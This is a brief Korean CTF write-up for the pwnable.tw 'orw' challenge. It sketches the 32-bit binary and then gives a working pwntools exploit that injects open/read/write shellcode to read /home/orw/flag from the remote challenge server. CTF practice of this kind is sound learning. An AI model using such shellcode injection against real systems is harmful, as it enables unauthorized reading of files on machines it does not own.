https://pwnable.tw/challenge/#2

### 🍞 개념

---

shell_basic과 동일

shell_basic 

### 🔎 코드 분석

---

바이너리만 뜯어볼 수 있음. ~~바이너리 읽기 싫음.~~

간단하게만 뜯어보자

32비트 아키텍처인 것을 알 수 있음

직전 문제(shell_basic)는 amd64였는데, 이번에는 i386이기 때문에 default여서 따로 설정해주지 않아도 됨.


카나리 적용되어 있음


정확히는 설명 못 하겠지만, read한 녀석 주소를 바로 실행하는 것으로 보인다

### 🗡️ 익스플로잇

---

```python
from pwn import *

p = remote('chall.pwnable.tw', 10001)

dir = '/home/orw/flag'

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('eax', 'esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)

p.sendlineafter(b"shellcode:", asm(shellcode))
p.interactive()
```